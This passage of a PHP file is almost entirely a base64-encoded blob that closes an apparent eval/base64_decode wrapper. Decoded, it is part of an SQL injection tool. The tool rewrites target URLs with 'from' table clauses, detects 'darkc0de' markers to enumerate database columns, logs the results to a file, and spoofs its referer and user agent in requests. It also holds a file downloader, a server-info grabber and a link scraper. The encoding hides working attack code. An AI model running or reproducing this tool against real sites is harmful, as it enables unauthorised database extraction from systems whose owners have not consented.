zMwNjQ2NSkiLCAkcnVybCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdXJsID0gc3RyX3JlcGxhY2UoIiRlbmRpbmciLCAiK2Zyb20rIi4kdGFibGUuIiskZW5kaW5nIiwgJHVybCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvZGFya2MwZGU6KC4qPyk6ZGFya2MwZGUvIiwgY29uX2hvc3QoJHVybCkpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlstXSBGb3VuZCBjb2x1bW46ICRjb2x1bW5cbiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ2luamVjdG9yLnR4dCcsICJbLV0gRm91bmQgY29sdW1uOiAkY29sdW1uXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ2luamVjdG9yLnR4dCcsICJcclxuIixGSUxFX0FQUEVORCk7CiAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiWy1dIERvbmUgc2VhcmNoaW5nIGNvbHVtbiBpbnNpZGUgJHRhYmxlIHRhYmxlXG4iOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgIHByaW50ICJbLV0gRG9uZVxuIjsKICAgIHByaW50ICJbLV0gU2VlICdpbmplY3Rvci50eHQnIHRvIHNlZSB0aGUgbG9nXG4iOwogICAgZXhpdDsKfQoKZnVuY3Rpb24gSGV4VmFsdWUoJHRleHQpIHsKICAgICBmb3IoJGkgPSAwOyAkaSA8IHN0cmxlbigkdGV4dCk7ICRpKyspIHsKICAgICAgICAgJGEgLj0gZGVjaGV4KG9yZCgkdGV4dFskaV0pKTsKICAgICB9CiAgICAgcmV0dXJuICRhOwp9Ci8qCiAqIGQwbHBoMW45OCAyMiBOb3YgMjAxNAogKiB0aGFua3Mgc2hhaHJpbCA6UAogKi8KZnVuY3Rpb24gd2dldCgpIHsKICBwcmludCAiVGhpcyBpcyBXZ2V0XG4iOwogIGZ3cml0ZShTVERPVVQsICItTGluayA6ICIpOwogICR1cmwgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgCiAgaWYoIWZpbGVfZXhpc3RzKCdkb3dubG9hZGVkJykpIHsKICAgIG1rZGlyKCdkb3dubG9hZGVkLycsIDA3NzcsIHRydWUpOwogIH0KCiAgJGRsb2FkX3BhdGggPSAnZG93bmxvYWRlZC8nOwogICRjaCA9IGN1cmxfaW5pdCgkdXJsKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04gLDEpOwogICRmcCA9IGZvcGVuKCRkbG9hZF9wYXRoLmJhc2VuYW1lKCR1cmwpLCAndysnKTsKICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKICAkZGF0YSA9IGN1cmxfZXhlYygkY2gpOwogIGN1cmxfY2xvc2UoJGNoKTsKICBmY2xvc2UoJGZwKTsKCiAgcHJpbnQgIlxuIjsKICBwcmludCAiWy1dIERvd25sb2FkIGZpbmlzaGVkICFcbiI7CiAgcHJpbnQgIlstXSBTYXZlZCBpbnRvICdkb3dubG9hZGVkJyBmb2xkZXJcbiI7Cn0KCmZ1bmN0aW9uIFF1aXQoKSB7CiAgICBwcmludCAiWytdIEV4aXQgdGhlIHByb2dyYW1cbiI7CiAgICBleGl0Owp9CgpmdW5jdGlvbiBHZXRfSW5mbygkc2l0ZSkgewogICAgaWYoJGluZm8gPSBjb25faG9zdCgkc2l0ZSkpIHsKICAgICAgICBwcmVnX21hdGNoKCIvQ29udGVudC1UeXBlOiguKykvIiwgJGluZm8sICR0eXBlKTsKICAgICAgICBwcmVnX21hdGNoKCIvU2VydmVyOiguKykvIiwgJGluZm8sICRzZXJ2ZXIpOwogICAgICAgIHByaW50ICJbLV0gJHR5cGVbMF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSAkc2VydmVyWzBdXG4iOwogICAgICAgICRpcCA9IHBhcnNlX3VybCgkc2l0ZSk7CiAgICAgICAgcHJpbnQgIlstXSBJUDogIi5nZXRob3N0YnluYW1lKCRpcFsnaG9zdCddKS4iXG4iOwogICAgfQp9CgpmdW5jdGlvbiBjb25faG9zdCgkaG9zdCkgewogICAgJGNoID0gY3VybF9pbml0KCRob3N0KTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMjAwKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRUZFUkVSLCAiaHR0cDovL2dvb2dsZS5jb20iKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA1LjE7IGVuLVVTOyBydjoxLjguMS45KSBHZWNrby8yMDA3MTAyNSBGaXJlZm94LzIuMC4wLjknKTsKICAgICRwZyA9IGN1cmxfZXhlYygkY2gpOwogICAgaWYoJHBnKXsKICAgICAgICByZXR1cm4gJHBnOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9Cn0KCmZ1bmN0aW9uIGZpbmRfbGluaygkc2l0ZSkgewogICAgaWYoJHRleHQgPSBjb25faG9zdCgkc2l0ZSkpIHsKICAgICRmaW5kID0gIi9ocmVmPVtcIiddPyhbXlwiJ10rKT9bXCInXT8vaSI7CiAgICBwcmVnX21hdGNoX2FsbCgkZmluZCwgJHRleHQsICRsaW5rcyk7CiAgICAKICAgIGZvcmVhY2goJGxpbmtzWzFdIGFzICRsaW5rKSB7CiAgICAgICAgJGFbXSA9ICRsaW5rOwogICAgfQogICAgcmV0dXJuICRhOwogfQp9Cg=="))

?>
